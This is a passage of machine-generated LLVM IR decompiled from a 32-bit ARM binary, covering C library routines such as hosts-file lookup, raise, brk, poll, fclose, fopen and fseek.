  %v5_1831c = inttoptr i32 %v4_1831c to i8*
  %v6_1831c = load i8, i8* %v5_1831c, align 1
  %v1_18320 = and i8 %v6_1831c, 32
  %v2_18320 = icmp eq i8 %v1_18320, 0
  br i1 %v2_18320, label %dec_label_pc_18328, label %dec_label_pc_18300

dec_label_pc_18328:                               ; preds = %dec_label_pc_18314
  %v7_18328 = icmp eq i32 %v0_18328, 10
  br i1 %v7_18328, label %dec_label_pc_18300, label %dec_label_pc_18330

dec_label_pc_18330:                               ; preds = %dec_label_pc_18300, %dec_label_pc_18328, %dec_label_pc_18308.preheader
  %v0_1833434 = phi i32 [ %v0_1830820, %dec_label_pc_18308.preheader ], [ %v5_18304, %dec_label_pc_18300 ], [ %v2_18304, %dec_label_pc_18328 ]
  %v0_18330 = load i32, i32* @r8, align 4
  %v1_18330 = add i32 %v0_18330, 1
  br label %dec_label_pc_18334

dec_label_pc_18334:                               ; preds = %dec_label_pc_182b0, %dec_label_pc_18330
  %storemerge = phi i32 [ %v1_18330, %dec_label_pc_18330 ], [ 0, %dec_label_pc_182b0 ]
  %v0_182c8 = phi i32 [ %v0_1833434, %dec_label_pc_18330 ], [ %v0_1833435, %dec_label_pc_182b0 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_18334 = inttoptr i32 %v0_182c8 to i8*
  %v2_18334 = load i8, i8* %v1_18334, align 1
  %v3_18334 = zext i8 %v2_18334 to i32
  %v2_18338 = icmp eq i8 %v2_18334, 0
  br i1 %v2_18338, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_18334
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_18334, %bb56
  %v0_18348.pr = phi i32 [ %v3_18334, %dec_label_pc_18334 ], [ 1, %bb56 ]
  %v1_18340 = add i32 %storemerge, -4
  %v3_18340 = sub i32 3, %storemerge
  %v4_18340 = and i32 %v3_18340, %storemerge
  %v5_18340 = icmp slt i32 %v4_18340, 0
  %v6_18340 = icmp slt i32 %v1_18340, 0
  %v7_18340 = icmp eq i32 %storemerge, 4
  %v3_18344 = xor i1 %v6_18340, %v5_18340
  %v4_18344 = or i1 %v7_18340, %v3_18344
  br i1 %v4_18344, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_18350

bb58:                                             ; preds = %bb57
  %v2_18348 = icmp eq i32 %v0_18348.pr, 0
  br i1 %v2_18348, label %dec_label_pc_18350, label %dec_label_pc_182c0

dec_label_pc_18350:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_20f44.1308 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1835c = call i32 @__GI_strcoll(i8* %v3_1835c, i32 ptrtoint ([11 x i8]* @global_var_20f44.1308 to i32))
  store i32 %v4_1835c, i32* %r0.global-to-local, align 4
  %v2_18360 = icmp eq i32 %v4_1835c, 0
  br i1 %v2_18360, label %dec_label_pc_18388.preheader, label %dec_label_pc_183ac

dec_label_pc_18388.preheader:                     ; preds = %dec_label_pc_18350
  br label %dec_label_pc_18388

dec_label_pc_18370:                               ; preds = %dec_label_pc_183a0
  %v1_18370 = add i32 %v5_18390, -36
  %v2_18370 = inttoptr i32 %v1_18370 to i32*
  %v3_18370 = load i32, i32* %v2_18370, align 4
  store i32 %v3_18370, i32* %r0.global-to-local, align 4
  %v1_18374 = inttoptr i32 %v3_18370 to i8*
  %v2_18374 = call i32 @__GI_strdup(i8* %v1_18374)
  store i32 %v2_18374, i32* %r0.global-to-local, align 4
  %v0_1837c = load i32, i32* @r4, align 4
  %v1_1837c = add i32 %v0_1837c, 1
  store i32 %v1_1837c, i32* %r2.global-to-local, align 4
  %v5_18380 = mul i32 %v0_1837c, 4
  %v6_18380 = add i32 %v5_18380, ptrtoint (i32* @global_var_2fc40.1122 to i32)
  %v7_18380 = inttoptr i32 %v6_18380 to i32*
  store i32 %v2_18374, i32* %v7_18380, align 4
  %v0_18384 = load i32, i32* %r2.global-to-local, align 4
  %v1_18384 = load i32, i32* @r7, align 4
  %v2_18384 = inttoptr i32 %v1_18384 to i32*
  store i32 %v0_18384, i32* %v2_18384, align 4
  %v0_1838c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18388

dec_label_pc_18388:                               ; preds = %dec_label_pc_18388.preheader, %dec_label_pc_18370
  %v0_18398 = phi i32 [ 1, %dec_label_pc_18388.preheader ], [ %v0_1838c.pre, %dec_label_pc_18370 ]
  store i32 %v2_182c0, i32* %r2.global-to-local, align 4
  %v1_1838c = load i32, i32* @r8, align 4
  %v2_1838c = sub i32 %v0_18398, %v1_1838c
  %v4_1838c = xor i32 %v1_1838c, %v0_18398
  %v5_1838c = xor i32 %v2_1838c, %v0_18398
  %v6_1838c = and i32 %v5_1838c, %v4_1838c
  %v7_1838c = icmp slt i32 %v6_1838c, 0
  %v8_1838c = icmp slt i32 %v2_1838c, 0
  %v4_18390 = mul i32 %v0_18398, 4
  %v5_18390 = add i32 %v4_18390, %v2_182c0
  store i32 ptrtoint (i32* @global_var_2fc4c.1119 to i32), i32* @r7, align 4
  %v1_18398 = add i32 %v0_18398, 1
  store i32 %v1_18398, i32* @r5, align 4
  %v2_1839c = xor i1 %v8_1838c, %v7_1838c
  br i1 %v2_1839c, label %dec_label_pc_183a0, label %dec_label_pc_183ac

dec_label_pc_183a0:                               ; preds = %dec_label_pc_18388
  %v2_183a0 = load i32, i32* @global_var_2fc4c.1119, align 4
  store i32 %v2_183a0, i32* @r4, align 4
  %v7_183a8 = icmp slt i32 %v2_183a0, 3
  br i1 %v7_183a8, label %dec_label_pc_18370, label %dec_label_pc_183ac

dec_label_pc_183ac:                               ; preds = %dec_label_pc_18388, %dec_label_pc_183a0, %dec_label_pc_18350
  %v0_183ac = load i32, i32* @r6, align 4
  store i32 %v0_183ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_20f50.1311 to i32), i32* @r1, align 4
  %v3_183b4 = inttoptr i32 %v0_183ac to i8*
  %v4_183b4 = call i32 @__GI_strcoll(i8* %v3_183b4, i32 ptrtoint ([7 x i8]* @global_var_20f50.1311 to i32))
  store i32 %v4_183b4, i32* %r0.global-to-local, align 4
  %v2_183b8 = icmp eq i32 %v4_183b4, 0
  br i1 %v2_183b8, label %dec_label_pc_183f0.preheader, label %dec_label_pc_183c0

dec_label_pc_183c0:                               ; preds = %dec_label_pc_183ac
  %v0_183c0 = load i32, i32* @r6, align 4
  store i32 %v0_183c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_20f58.1313 to i32), i32* @r1, align 4
  %v3_183c8 = inttoptr i32 %v0_183c0 to i8*
  %v4_183c8 = call i32 @__GI_strcoll(i8* %v3_183c8, i32 ptrtoint ([7 x i8]* @global_var_20f58.1313 to i32))
  store i32 %v4_183c8, i32* %r0.global-to-local, align 4
  %v2_183cc = icmp eq i32 %v4_183c8, 0
  br i1 %v2_183cc, label %dec_label_pc_183f0.preheader, label %dec_label_pc_1844c.backedge

dec_label_pc_183f0.preheader:                     ; preds = %dec_label_pc_183ac, %dec_label_pc_183c0
  store i32 ptrtoint (i32* @global_var_2fc50.1287 to i32), i32* @r4, align 4
  %v2_183f460 = load i32, i32* @global_var_2fc50.1287, align 4
  store i32 ptrtoint (i32* @global_var_2fc30.1291 to i32), i32* @r5, align 4
  %v1_1840063 = add i32 %v2_183f460, -1
  store i32 %v1_1840063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_183f460, 1
  br i1 %tmp5964, label %dec_label_pc_18408, label %dec_label_pc_183d8

dec_label_pc_183d8:                               ; preds = %dec_label_pc_183f0.preheader, %dec_label_pc_183d8
  %v1_1840065 = phi i32 [ %v1_18400, %dec_label_pc_183d8 ], [ %v1_1840063, %dec_label_pc_183f0.preheader ]
  %v4_183d8 = mul i32 %v1_1840065, 4
  %v5_183d8 = add i32 %v4_183d8, ptrtoint (i32* @global_var_2fc30.1291 to i32)
  %v6_183d8 = inttoptr i32 %v5_183d8 to i32*
  %v7_183d8 = load i32, i32* %v6_183d8, align 4
  store i32 %v7_183d8, i32* %r0.global-to-local, align 4
  store i32 %v1_1840065, i32* @global_var_2fc50.1287, align 4
  %v1_183e0 = call i32 @free(i32 %v7_183d8)
  store i32 %v1_183e0, i32* %r0.global-to-local, align 4
  %v0_183e4 = load i32, i32* @r4, align 4
  %v1_183e4 = inttoptr i32 %v0_183e4 to i32*
  %v2_183e4 = load i32, i32* %v1_183e4, align 4
  %v1_183ec = load i32, i32* @r5, align 4
  %v5_183ec = mul i32 %v2_183e4, 4
  %v6_183ec = add i32 %v1_183ec, %v5_183ec
  %v7_183ec = inttoptr i32 %v6_183ec to i32*
  store i32 0, i32* %v7_183ec, align 4
  store i32 ptrtoint (i32* @global_var_2fc50.1287 to i32), i32* @r4, align 4
  %v2_183f4 = load i32, i32* @global_var_2fc50.1287, align 4
  store i32 ptrtoint (i32* @global_var_2fc30.1291 to i32), i32* @r5, align 4
  %v1_18400 = add i32 %v2_183f4, -1
  store i32 %v1_18400, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_183f4, 1
  br i1 %tmp59, label %dec_label_pc_18408, label %dec_label_pc_183d8

dec_label_pc_18408:                               ; preds = %dec_label_pc_183d8, %dec_label_pc_183f0.preheader
  br label %dec_label_pc_18428

dec_label_pc_18410:                               ; preds = %dec_label_pc_18440
  %v1_18410 = add i32 %v5_18430, -36
  %v2_18410 = inttoptr i32 %v1_18410 to i32*
  %v3_18410 = load i32, i32* %v2_18410, align 4
  store i32 %v3_18410, i32* %r0.global-to-local, align 4
  %v1_18414 = inttoptr i32 %v3_18410 to i8*
  %v2_18414 = call i32 @__GI_strdup(i8* %v1_18414)
  store i32 %v2_18414, i32* %r0.global-to-local, align 4
  %v0_1841c = load i32, i32* @r4, align 4
  %v1_1841c = add i32 %v0_1841c, 1
  store i32 %v1_1841c, i32* %r2.global-to-local, align 4
  %v5_18420 = mul i32 %v0_1841c, 4
  %v6_18420 = add i32 %v5_18420, ptrtoint (i32* @global_var_2fc30.1291 to i32)
  %v7_18420 = inttoptr i32 %v6_18420 to i32*
  store i32 %v2_18414, i32* %v7_18420, align 4
  %v0_18424 = load i32, i32* %r2.global-to-local, align 4
  %v1_18424 = load i32, i32* @r6, align 4
  %v2_18424 = inttoptr i32 %v1_18424 to i32*
  store i32 %v0_18424, i32* %v2_18424, align 4
  %v0_1842c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_18408, %dec_label_pc_18410
  %v0_18438 = phi i32 [ 1, %dec_label_pc_18408 ], [ %v0_1842c.pre, %dec_label_pc_18410 ]
  store i32 %v2_182c0, i32* %r2.global-to-local, align 4
  %v1_1842c = load i32, i32* @r8, align 4
  %v2_1842c = sub i32 %v0_18438, %v1_1842c
  %v4_1842c = xor i32 %v1_1842c, %v0_18438
  %v5_1842c = xor i32 %v2_1842c, %v0_18438
  %v6_1842c = and i32 %v5_1842c, %v4_1842c
  %v7_1842c = icmp slt i32 %v6_1842c, 0
  %v8_1842c = icmp slt i32 %v2_1842c, 0
  %v4_18430 = mul i32 %v0_18438, 4
  %v5_18430 = add i32 %v4_18430, %v2_182c0
  store i32 ptrtoint (i32* @global_var_2fc50.1287 to i32), i32* @r6, align 4
  %v1_18438 = add i32 %v0_18438, 1
  store i32 %v1_18438, i32* @r5, align 4
  %v2_1843c = xor i1 %v8_1842c, %v7_1842c
  br i1 %v2_1843c, label %dec_label_pc_18440, label %dec_label_pc_1844c.backedge

dec_label_pc_18440:                               ; preds = %dec_label_pc_18428
  %v2_18440 = load i32, i32* @global_var_2fc50.1287, align 4
  store i32 %v2_18440, i32* @r4, align 4
  %v7_18448 = icmp slt i32 %v2_18440, 4
  br i1 %v7_18448, label %dec_label_pc_18410, label %dec_label_pc_1844c.backedge

dec_label_pc_1827c.preheader:                     ; preds = %dec_label_pc_1827c.preheader.lr.ph, %dec_label_pc_1844c.backedge
  store i32 %v2_18210, i32* %r0.global-to-local, align 4
  %v2_1827c12 = load i8, i8* %v1_1827c11, align 4
  %v3_1827c13 = zext i8 %v2_1827c12 to i32
  store i32 %v3_1827c13, i32* %r2.global-to-local, align 4
  %v2_1828014 = icmp eq i8 %v2_1827c12, 0
  br i1 %v2_1828014, label %dec_label_pc_1829c, label %dec_label_pc_18288.lr.ph

dec_label_pc_18288.lr.ph:                         ; preds = %dec_label_pc_1827c.preheader
  %v2_1828c.pre = load i32, i32* @global_var_29594, align 4
  br label %dec_label_pc_18288

dec_label_pc_1846c:                               ; preds = %dec_label_pc_1844c.backedge, %dec_label_pc_1844c.preheader
  %v0_1846c = load i32, i32* @sl, align 4
  store i32 %v0_1846c, i32* %r0.global-to-local, align 4
  %v1_18470 = inttoptr i32 %v0_1846c to i8*
  %v2_18470 = call i32 @__GI_fclose(i8* %v1_18470)
  store i32 %v2_18470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18484

dec_label_pc_18478:                               ; preds = %dec_label_pc_18260
  %v0_18478 = call i32 @__GI___h_errno_location()
  store i32 %v0_18478, i32* %r0.global-to-local, align 4
  %v2_18480 = inttoptr i32 %v0_18478 to i32*
  store i32 3, i32* %v2_18480, align 4
  br label %dec_label_pc_18484

dec_label_pc_18484:                               ; preds = %entry, %dec_label_pc_1846c, %dec_label_pc_18478
  store i32 %v2_18214, i32* @r0, align 4
  %v1_18494 = call i32 @__pthread_return_void()
  store i32 %v1_18494, i32* %r0.global-to-local, align 4
  store i32 %v6_1820c, i32* @r5, align 4
  store i32 %v9_1820c, i32* @r6, align 4
  store i32 %v12_1820c, i32* @r7, align 4
  store i32 %v15_1820c, i32* @r8, align 4
  store i32 %v18_1820c, i32* @sl, align 4
  ret i32 %v1_18494

; uselistorder directives
  uselistorder i32 %v3_1827c13, { 2, 1, 0 }
  uselistorder i32 %v2_1842c, { 1, 0 }
  uselistorder i32 %v0_18438, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_18400, { 1, 0 }
  uselistorder i32 %v1_1840065, { 1, 0 }
  uselistorder i32 %v2_1838c, { 1, 0 }
  uselistorder i32 %v0_18398, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_182c8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_1830820, { 1, 0, 2 }
  uselistorder i32 %v2_182c0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_18210, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 7, 5, 6, 8, 3, 11, 9, 10, 12, 2, 13, 1, 14, 16, 15, 4, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 6, 5, 23, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 24, 17, 18, 22, 19, 21, 26, 25, 20, 3, 2, 27, 29, 1, 28 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 6, 0, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_2fc30.1291 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_2fc50.1287, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2fc50.1287 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2fc40.1122 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_2fc4c.1119, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_18484, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1827c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18428, { 1, 0 }
  uselistorder label %dec_label_pc_183d8, { 1, 0 }
  uselistorder label %dec_label_pc_183f0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_183ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18388, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_18334, { 1, 0 }
  uselistorder label %dec_label_pc_18330, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18314, { 1, 0 }
  uselistorder label %dec_label_pc_18300, { 1, 0 }
  uselistorder label %dec_label_pc_182e0, { 1, 0 }
  uselistorder label %dec_label_pc_1844c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_1829c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1844c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1851c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_1851c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_18528 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_18530 = call i32 @__libc_getpid()
  store i32 %v3_18528, i32* @r4, align 4
  %v0_1853c = call i32 @kill()
  ret i32 %v0_1853c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18540 = add i32 %arg1, 28
  %v2_18540 = inttoptr i32 %v1_18540 to i32*
  %v3_18540 = load i32, i32* %v2_18540, align 4
  %v1_18548 = add i32 %arg1, 44
  %v2_18548 = inttoptr i32 %v1_18548 to i32*
  %v3_18548 = load i32, i32* %v2_18548, align 4
  store i32 %v3_18540, i32* @global_var_2fc54.1318, align 4
  store i32 %v3_18548, i32* @global_var_2fc58.1320, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1856c = call i32 @brk(i32* %arg1)
  %v3_18570 = icmp ult i32 %v2_1856c, %tmp
  store i32 %v2_1856c, i32* @global_var_2fb84.1246, align 4
  br i1 %v3_18570, label %dec_label_pc_18584, label %dec_label_pc_18594

dec_label_pc_18584:                               ; preds = %entry
  %v0_18584 = call i32 @__errno_location()
  %v2_1858c = inttoptr i32 %v0_18584 to i32*
  store i32 12, i32* %v2_1858c, align 4
  br label %dec_label_pc_18594

dec_label_pc_18594:                               ; preds = %entry, %dec_label_pc_18584
  %v0_18594 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_18584 ]
  ret i32 %v0_18594

; uselistorder directives
  uselistorder i32* @global_var_2fb84.1246, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18594, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_185a0 = load i32, i32* @r4, align 4
  store i32 %v3_185a0, i32* %stack_var_-8, align 4
  %v5_185a4 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_185a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_185a4, -4095
  br i1 %tmp, label %dec_label_pc_185c4, label %dec_label_pc_185b4

dec_label_pc_185b4:                               ; preds = %entry
  %v0_185b4 = call i32 @__errno_location()
  %v0_185b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_185b8 = sub i32 0, %v0_185b8
  %v2_185bc = inttoptr i32 %v0_185b4 to i32*
  store i32 %v1_185b8, i32* %v2_185bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_185c4

dec_label_pc_185c4:                               ; preds = %entry, %dec_label_pc_185b4
  %v0_185c4 = phi i32 [ %v5_185a4, %entry ], [ -1, %dec_label_pc_185b4 ]
  %v2_185c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_185c8, i32* @r4, align 4
  ret i32 %v0_185c4

; uselistorder directives
  uselistorder i32 %v5_185a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_185c4, { 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_185d0 = add i32 %tmp, 52
  %v3_185d0 = inttoptr i32 %v2_185d0 to i32*
  %v4_185d0 = load i32, i32* %v3_185d0, align 4
  store i32 %v4_185d0, i32* @r8, align 4
  %v2_185d4 = add i32 %tmp, 56
  store i32 %v2_185d4, i32* @r5, align 4
  %v2_185d8 = ptrtoint i32* %stack_var_-64 to i32
  %v2_185dc = icmp eq i32 %v4_185d0, 0
  store i1 %v2_185dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_185ec = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_185ec, i32* @r0, align 4
  br i1 %v2_185dc, label %dec_label_pc_185f4, label %dec_label_pc_18610

dec_label_pc_185f4:                               ; preds = %entry
  store i32 89400, i32* %r3.global-to-local, align 4
  %v1_185fc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r3.global-to-local, align 4
  %v1_1860c = call i32 @__pthread_return_0()
  %v0_18610.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18610

dec_label_pc_18610:                               ; preds = %entry, %dec_label_pc_185f4
  %v0_18618 = phi i32 [ %tmp, %entry ], [ %v0_18610.pre, %dec_label_pc_185f4 ]
  %v1_18610 = inttoptr i32 %v0_18618 to i8*
  %v2_18610 = load i8, i8* %v1_18610, align 1
  %v3_18610 = zext i8 %v2_18610 to i32
  %v1_18614 = and i32 %v3_18610, 64
  store i32 %v1_18614, i32* %r3.global-to-local, align 4
  %v2_18614 = icmp eq i32 %v1_18614, 0
  store i1 %v2_18614, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_18614, i32* @r7, align 4
  br i1 %v2_18614, label %dec_label_pc_1862c, label %dec_label_pc_18624

dec_label_pc_18624:                               ; preds = %dec_label_pc_18610
  %v3_18624 = call i32 @fflush_unlocked(i8* %v1_18610)
  store i32 %v3_18624, i32* @r7, align 4
  %v0_1862c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1862c

dec_label_pc_1862c:                               ; preds = %dec_label_pc_18610, %dec_label_pc_18624
  %v0_1862c = phi i32 [ %v0_18618, %dec_label_pc_18610 ], [ %v0_1862c.pre, %dec_label_pc_18624 ]
  %v1_1862c = add i32 %v0_1862c, 4
  %v2_1862c = inttoptr i32 %v1_1862c to i32*
  %v3_1862c = load i32, i32* %v2_1862c, align 4
  %v1_18630 = call i32 @__libc_close(i32 %v3_1862c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_18638 = icmp slt i32 %v1_18630, 0
  %v2_18638 = icmp eq i32 %v1_18630, 0
  store i1 %v2_18638, i1* %cpsr_z.global-to-local, align 1
  %v1_1863c = load i32, i32* @r4, align 4
  %v2_1863c = add i32 %v1_1863c, 4
  %v3_1863c = inttoptr i32 %v2_1863c to i32*
  store i32 -1, i32* %v3_1863c, align 4
  store i32 %v2_185d8, i32* @r0, align 4
  br i1 %v1_18638, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_1862c
  %v3_18650 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_18650, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_1862c, %bb
  %v1_1865c = call i32 @__pthread_return_void()
  %v1_18668 = call i32 @__pthread_return_0()
  %v2_18670 = load i32, i32* @global_var_2d92c.1327, align 4
  %v1_18674 = add i32 %v2_18670, 1
  store i32 %v1_18674, i32* %r3.global-to-local, align 4
  store i32 %v1_18674, i32* @global_var_2d92c.1327, align 4
  store i32 %v2_185d8, i32* @r0, align 4
  %v1_1868c = call i32 @__pthread_return_void()
  %v0_18690 = load i32, i32* @r4, align 4
  %v1_18690 = inttoptr i32 %v0_18690 to i32*
  %v2_18690 = load i32, i32* %v1_18690, align 4
  %v1_18694 = and i32 %v2_18690, 24576
  store i32 %v1_18694, i32* %r3.global-to-local, align 4
  %v3_186981 = udiv i32 %v1_18694, 256
  %v1_1869c = trunc i32 %v3_186981 to i8
  %v3_1869c = add i32 %v0_18690, 1
  %v4_1869c = inttoptr i32 %v3_1869c to i8*
  store i8 %v1_1869c, i8* %v4_1869c, align 1
  %v0_186a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_186a0 = trunc i32 %v0_186a0 to i8
  %v2_186a0 = load i32, i32* @r4, align 4
  %v3_186a0 = inttoptr i32 %v2_186a0 to i8*
  store i8 %v1_186a0, i8* %v3_186a0, align 1
  %v0_186a4 = load i32, i32* @r4, align 4
  %v1_186a4 = inttoptr i32 %v0_186a4 to i32*
  %v2_186a4 = load i32, i32* %v1_186a4, align 4
  %v1_186a8 = or i32 %v2_186a4, 48
  store i32 %v1_186a8, i32* %r3.global-to-local, align 4
  %v3_186ac = sdiv i32 %v2_186a4, 256
  %v0_186b0 = load i32, i32* @r8, align 4
  %v2_186b0 = icmp eq i32 %v0_186b0, 0
  store i1 %v2_186b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_185ec, i32* @r0, align 4
  %v1_186c0 = trunc i32 %v3_186ac to i8
  %v3_186c0 = add i32 %v0_186a4, 1
  %v4_186c0 = inttoptr i32 %v3_186c0 to i8*
  store i8 %v1_186c0, i8* %v4_186c0, align 1
  %v0_186c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_186c4 = trunc i32 %v0_186c4 to i8
  %v2_186c4 = load i32, i32* @r4, align 4
  %v3_186c4 = inttoptr i32 %v2_186c4 to i8*
  store i8 %v1_186c4, i8* %v3_186c4, align 1
  %v0_186c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_186c8, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_186cc = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_186d0 = load i32, i32* @r4, align 4
  %v1_186d0 = add i32 %v0_186d0, 1
  %v2_186d0 = inttoptr i32 %v1_186d0 to i8*
  %v3_186d0 = load i8, i8* %v2_186d0, align 1
  %v4_186d0 = zext i8 %v3_186d0 to i32
  store i32 %v4_186d0, i32* %r3.global-to-local, align 4
  %v1_186d4 = and i32 %v4_186d0, 64
  %v2_186d4 = icmp eq i32 %v1_186d4, 0
  store i1 %v2_186d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186d4, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_186dc = xor i1 %v2_186d4, true
  call void @__pseudo_cond_branch(i1 %v1_186dc, i32 ptrtoint (i32* @global_var_14e1c.1293 to i32))
  store i32 %v2_185d8, i32* @r0, align 4
  %v1_186f0 = call i32 @__pthread_return_void()
  %v1_186fc = call i32 @__pthread_return_0()
  %v2_18704 = load i32, i32* @global_var_2d930.1331, align 4
  %v1_18708 = add i32 %v2_18704, 1
  store i32 %v1_18708, i32* %r3.global-to-local, align 4
  store i32 %v2_185d8, i32* @r0, align 4
  store i32 %v1_18708, i32* @global_var_2d930.1331, align 4
  %v1_1871c = call i32 @__pthread_return_void()
  %v1_18720 = call i32 @_stdio_openlist_dec_use(i32 %v1_1871c)
  %v0_18724 = load i32, i32* @r7, align 4
  ret i32 %v0_18724

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__libc_close, { 4, 3, 21, 20, 19, 18, 17, 16, 15, 2, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_1862c, { 1, 0 }
  uselistorder label %dec_label_pc_18610, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_18754 = call i32 @_stdio_fopen()
  ret i32 %v0_18754
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_18758 = load i32, i32* @r2, align 4
  store i32 %v0_18758, i32* @r3, align 4
  %v0_18760 = call i32 @__GI_fseeko64()
  ret i32 %v0_18760
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_18764 = load i32, i32* @r4, align 4
  %v6_18764 = load i32, i32* @r5, align 4
  %v9_18764 = load i32, i32* @r6, align 4
  %v0_18768 = load i32, i32* @r3, align 4
  %v2_1876c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_18768, i32* @r6, align 4
  %v0_18774 = load i32, i32* @r0, align 4
  store i32 %v0_18774, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_18768, 3
